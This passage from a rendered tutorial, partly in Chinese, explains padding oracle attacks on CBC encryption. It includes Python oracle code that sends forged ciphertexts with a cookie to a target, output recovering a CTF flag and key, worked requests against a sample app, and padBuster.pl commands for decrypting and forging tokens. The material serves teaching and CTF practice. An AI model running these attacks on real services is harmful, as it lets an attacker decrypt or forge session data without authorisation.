punctuation"}},[t._v("}")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("00685C52A2E60662802DBC2D025A28CD")]),t._v("\n\t\t\t\t\t\t\t"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Block Padding"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("10101010101010101010101010101010")]),t._v("\n\n\t\t\t\t\t\t\t"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("36m"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("1m"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(""),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("0m Found "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("16")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token builtin"}},[t._v("bytes")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("7b22666c6167223a20225e464c41475e")]),t._v("\n                        bytes_found "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('""')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("join"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("valide_value"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n                    \n\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("def")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("call_oracle")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("host"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" cookie"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" url"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" post"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" method"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" up_cipher"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("if")]),t._v(" post"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v("\n        params "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" urlencode"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("post"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("else")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v("\n        params "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" urlencode"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n    headers "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n        "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"Content-type"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"application/x-www-form-urlencoded"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("\n        "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"Accept"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"text/plain"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("\n        "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"Cookie"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" cookie"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n    conn "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" http"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("client"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("HTTPConnection"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("host"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n    base64Data "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" base64"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("standard_b64encode"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token builtin"}},[t._v("bytearray")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("fromhex"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("up_cipher"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n    base64Data "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" base64Data"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("decode"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'ascii'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("replace"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'='")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'~'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("replace"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'/'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'!'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("replace"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'+'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'-'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("print")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"\\nbase64Data"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("print")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("url "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v(" base64Data"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n    conn"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("request"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("method"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" url "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v(" base64Data"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" params"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" headers"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n    response "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" conn"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("getresponse"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("return")]),t._v(" conn"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" response\n                                          \n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("def")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("test_validity_customize")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("response"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" error"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v("\n\t"),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("try")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v("\n\t\tdata "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" response"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("read"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("decode"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'utf-8'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n\t\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("#print(data)")]),t._v("\n\t\t"),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("if")]),t._v(" error "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("in")]),t._v(" data"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v("\n\t\t    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("return")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),t._v("\n\t\t"),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("else")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v("\t\n\t\t\t"),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("print")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"response:"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n\t\t\t"),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("print")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("data"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n\t\t\t"),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("return")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),t._v("\n\t"),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("except")]),t._v(" Exception "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("as")]),t._v(" e"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v("\n\t\t"),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("print")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("e"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n\t\t"),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("pass")]),t._v("\n\t"),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("return")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),t._v("\n                                          \nrun"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("\n        base64"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("standard_b64decode"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("args"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("cipher"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("replace"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'~'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'='")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("replace"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'!'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'/'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("replace"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'-'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'+'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("\n        args"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("length_block_cipher"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("\n        args"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("host"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("\n        args"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("urltarget"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("\n        args"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("cookie"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("\n        args"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("method"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("\n        args"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("post"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("\n        args"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("error"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("7B22666C6167223A20225E464C41475E")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("38393766656530303937383365373134")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("65373566663364396232353665336436")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("64333337373135643931333236336463")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("33386437663633366533393163633532")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("24464C414724222C20226964223A2022")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("32222C20226B6579223A202243422149")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("7457596D64692D57356A65684A335567")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("47517E7E227D0A0A0A0A0A0A0A0A0A0A")]),t._v("\n\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Decrypted value "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("HEX"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("7B22666C6167223A20225E464C41475E3839376665653030393738336537313465373566663364396232353665336436643333373731356439313332363364633338643766363336653339316363353224464C414724222C20226964223A202232222C20226B6579223A2022434221497457596D64692D57356A65684A33556747517E7E227D0A0A0A0A0A0A0A0A0A0A")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Decrypted value "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("ASCII"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"flag"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"^FLAG^897fee009783e714e75ff3d9b256e3d6d337715d913263dc38d7f636e391cc52$FLAG$"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"id"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"2"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"key"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"CB!ItWYmdi-W5jehJ3UgGQ~~"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n\n")])])]),a("h2",{attrs:{id:"经典思路"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#经典思路"}},[t._v("#")]),t._v(" 经典思路")]),t._v(" "),a("h3",{attrs:{id:"padbuster原理"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#padbuster原理"}},[t._v("#")]),t._v(" Padbuster原理")]),t._v(" "),a("p",[t._v("研究padbuster的Intermediate Value")]),t._v(" "),a("p",[t._v("https://blog.gdssecurity.com/labs/2010/9/14/automated-padding-oracle-attacks-with-padbuster.html")]),t._v(" "),a("p",[t._v("这个思路跟前面类似，但是略有不同：")]),t._v(" "),a("p",[t._v("同样是：given two-block ciphertext IV,c0，最简单的我们的明文或叫encoded data是P只有一个block P1，所以加密后加上IV只有两个block:")]),t._v(" "),a("p",[t._v("c=(C0,C1) C0 = IV\t生成的密文IV是prepend前面作为第一个block")]),t._v(" "),a("p",[t._v("C1 = Ek(P1 ⊕ C0)")]),t._v(" "),a("p",[t._v("P1 = Dk(C1) ⊕ C0 = Dk(C1) ⊕ IV")]),t._v(" "),a("p",[t._v("C0也就是IV是已知的，但是注意，跟前面不同的是，我们这里攻击时，每次只用一个block，意思是这种情况，我们并不使用C0/IV，而是将C0/IV初始为0，如果是8字节，使用改造的C0'=IV‘=0x00，怎么玩呢：")]),t._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v("同样我们利用的还是\nlast-byte-of(P1) \n= last-byte-of(Dk(C1) ⊕ C0) \n= last-byte-of(Dk(C1) ⊕ IV)\n但是不同的是，我们让last-byte-of(C0')=last-byte-of(IV')=0x0g，其他字节全部是0, 0x0g从0x00到0xff 256中可能，\n换句话C0'=IV'=[0x00000...00, 0x00000...ff]\n\nP1'=Dk(C1) ⊕ C0'= Dk(C1) ⊕ IV'\n=Dk(C1) ⊕ 0x0g\n=P1 ⊕ 0x0g\n\n这里将Dk(C1)的结果称为Intermediary Value,然后我们操作的字节，比如这里的最后一个字节称为Intermediary Byte，\n假设P1  ⊕ 0x00的结果是0x01，\n前面说过\n0x01\n0x0202\n0x030303\n都是合法的padding，发送C0'|C1到服务可以通过padding validate（服务器会根据C0'和C1 算P1 = Dk(C1) ⊕ C0'\n\n=>\nIntermediary Byte ⊕ 0x0g = 0x01\nlast-byte-of(Dk(C1)) = Intermediary Byte = 0x0g ⊕ 0x01\n我们得到了中间值，再异或上真正的IV的第一个字节就得出了plain text：\nlast-byte-of(P1) = last-byte-of(Dk(C1) ⊕ IV) = 0x0g ⊕ 0x01 ⊕ last-byte-of(IV)\n\n可以看到跟我们之前的思路区别不算很大，基本的区分就是第一种思路是在C(i-1)上做运算，构造C(i-1) ⊕ 0x0g ⊕ 0x01，直接带入了C(i-1)，而这里我们是先将C(i-1)'完全置零，从第一个字节遍历256种可能找到中间值，再XOR C(i-1)的值获取plain text\n\n")])])]),a("h3",{attrs:{id:"例子"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#例子"}},[t._v("#")]),t._v(" 例子")]),t._v(" "),a("p",[a("img",{attrs:{src:"/docs/docs_image/coder2hacker/realcase/padding_oracle03.png",alt:""}})]),t._v(" "),a("p",[t._v("http://sampleapp/home.jsp?UID=7B216A634951170FF851D6CC68FC9537858795A28ED4AAC6")]),t._v(" "),a("p",[t._v("7B216A634951170F\tIV\nF851D6CC68FC9537\tBRIAN;12\n858795A28ED4AAC6\t;2;55555")]),t._v(" "),a("p",[t._v("http://sampleapp/home.jsp?UID=0000000000000000F851D6CC68FC9537\n500 - Internal Server Erro\nhttp://sampleapp/home.jsp?UID=0000000000000001F851D6CC68FC9537\n500 - Internal Server Erro\nhttp://sampleapp/home.jsp?UID=000000000000003CF851D6CC68FC9537\n200 OK\nIf [Intermediary Byte] ^ 0x3C == 0x01,\nthen [Intermediary Byte] == 0x3C ^ 0x01,\nso [Intermediary Byte] == 0x3D\n[IV Byte] == 0x0F\nPlainText(Decrypted Value) == [Intermediary Byte] ^ [IV Byte] == 0x3D ^ 0x0F== 0x32")]),t._v(" "),a("p",[t._v("padBuster.pl http://sampleapp/home.jsp?UID=7B216A634951170FF851D6CC68FC9537858795A28ED4AAC6 7B216A634951170FF851D6CC68FC9537858795A28ED4AAC6 8 -encoding 2")]),t._v(" "),a("h3",{attrs:{id:"逆向改造明文区块加密"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#逆向改造明文区块加密"}},[t._v("#")]),t._v(" 逆向改造明文区块加密")]),t._v(" "),a("p",[a("img",{attrs:{src:"/docs/docs_image/coder2hacker/realcase/padding_oracle04.png",alt:""}})]),t._v(" "),a("p",[t._v('改变第一个区块的明文\n利用第一个区块的解密值生成加密的中间值intermediary value生成新IV\nYou have probably noticed that once we are able to deduce the intermediary value for a given ciphertext block,\nwe can manipulate the IV value in order to have complete control over the value that the ciphertext is decrypted to.\nSo in the previous example of the first ciphertext block that we brute forced,\nif you want the block to decrypt to a value of "TEST" you can calculate the required IV needed to produce this value by XORing the desired plaintext against the intermediary value.\nSo the string "TEST" (padded with four 0x04 bytes, of course) would be XORed against the intermediary value to produce the needed IV of 0x6D, 0x36, 0x70, 0x76, 0x03, 0x6E, 0x22, 0x39.')]),t._v(" "),a("p",[t._v("6D367076036E2239\tNEW IV\nF851D6CC68FC9537\tTEST4444")]),t._v(" "),a("p",[t._v("http://sampleapp/home.jsp?UID=6D367076036E2239F851D6CC68FC9537")]),t._v(" "),a("p",[t._v("只有一个区块或者只需要修改第一个区块的时候，我们可以用上面的方式通过更改IV达到‘更改’明文的目的，注意到第一个区块的密文并没有改变，但是如果我们想要修改第二个区块该怎么玩？\n因为我们第二个区块的密文不可以改变，明文是第一个区块的加密值XOR第二个区块的解密中间值，这两个都不可以改，怎么搞？\n比如ENCRYPT TEST，注意到“ENCRYPT ”是第一个区块8个字节，TEST在这里就变成了第二个字节")]),t._v(" "),a("p",[t._v('When constructing more than a single block, we actually start with the last block and move backwards to generate a valid ciphertext.\nIn this example, the last block is the same before, so we already know that the following IV and ciphertext will produce the string "TEST".')]),t._v(" "),a("p",[t._v("we need to figure out what intermediary value 6D367076036E2239 would decrypt to if it were passed as ciphertext instead of just an IV.\nWe can do this by using the same technique used in the decryption exploit by sending it as the ciphertext block and starting our brute force attack with all nulls.\nhttp://sampleapp/home.jsp?UID=00000000000000006D367076036E2239")]),t._v(" "),a("p",[t._v("Once we brute force the intermediary value, the IV can be manipulated to produce whatever text we want.\nThe new IV can then be pre-pended to the previous sample, which produces the valid two-block ciphertext of our choice. This process can be repeated an unlimited number of times to encrypt data of any length.")]),t._v(" "),a("p",[t._v("解释一下,很简单,首先我们已经知道一个区块的时候,这个\nhttp://sampleapp/home.jsp?UID=6D367076036E2239F851D6CC68FC9537\n可以解密出TEST，即这里的第二个区块，所以我们现在要思考的是怎么构造第一个区块，很简单让第一个区块的密文就等于这个新IV 6D367076036E2239即可，\n永远记住：\nP(i) = C(i-1) XOR P-IntermediaryValue(i)\n第一个区块是的C(1-1)=C0=IV,\nDecrypted Value = IV XOR Intermediary Value(重用之前破解的第一个区块的中间值，或者说是重用第一个区块的密文，因为中间值不变则密文不变)\n所以刚才是\n'TEST4444'\t= IV XOR Intermediary Value 算出IV=6D367076036E2239\n那么现在我们需要将IV作为C1：\nP2='TEST4444'\t= C1 XOR Intermediary Value， C1=6D367076036E2239\n然后\nP1=\"ENCRYPT \" = C0 XOR Intermediary Value = IV XOR Intermediary Value, 为了保证C1也就是P1即这里的Intermediary Value中间值对应的密文是6D367076036E2239，\n我们需要利用技巧，将跟前面破解过程一样，将6D367076036E2239作为密文来获取其中间值（我们可以想象，由于服务器用的IV还是最上面的7B216A634951170F，自然得到的明文不会是\"ENCRYPT \",\n我们并不关心这个，我们只想要到中间值，获取后，就可以算出C0也就是新新IV'')\nhttp://sampleapp/home.jsp?UID=00000000000000006D367076036E2239")]),t._v(" "),a("p",[t._v("'TEST4444' = IV'' XOR Intermediary Value")]),t._v(" "),a("p",[t._v("Once we brute force the intermediary value, the IV can be manipulated to produce whatever text we want. The new IV can then be pre-pended to the previous sample, which produces the valid two-block ciphertext of our choice. This process can be repeated an unlimited number of times to encrypt data of any length.")]),t._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v('padBuster.pl http://sampleapp/home.jsp?UID=7B216A634951170FF851D6CC68FC9537858795A28ED4AAC6 7B216A634951170FF851D6CC68FC9537858795A28ED4AAC6 8 -encoding 2 -plaintext "ENCRYPT TEST"\n=>提供第一个区块的密文和中间值会更节省时间\npadBuster.pl http://sampleapp/home.jsp?UID=7B216A634951170FF851D6CC68FC9537858795A28ED4AAC6\n7B216A634951170FF851D6CC68FC9537858795A28ED4AAC6 8 -encoding 2 -plaintext "ENCRYPT TEST"\n-ciphertext F851D6CC68FC9537 -intermediary 39732322076A263D\n')])])]),a("p",[t._v("Note：其实理论上我们可以利用任何一个区块的中间值和密文，并不一定用第一个区块的")]),t._v(" "),a("h3",{attrs:{id:"难度升级"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#难度升级"}},[t._v("#")]),t._v(" 难度升级")]),t._v(" "),a("p",[t._v("难度点：")]),t._v(" "),a("ul",[a("li",[t._v("不带IV")]),t._v(" "),a("li",[t._v("返回的exception有语法判断，没有特定的错误提示")])]),t._v(" "),a("p",[t._v("基本判断：")]),t._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v("密文的blocksize是8还是16还是其他；\n密文的第一个区块是iv还是对应的明文加密（不带iv）；\n判断语法检查：verify that there are no syntax checks performed on the decrypted 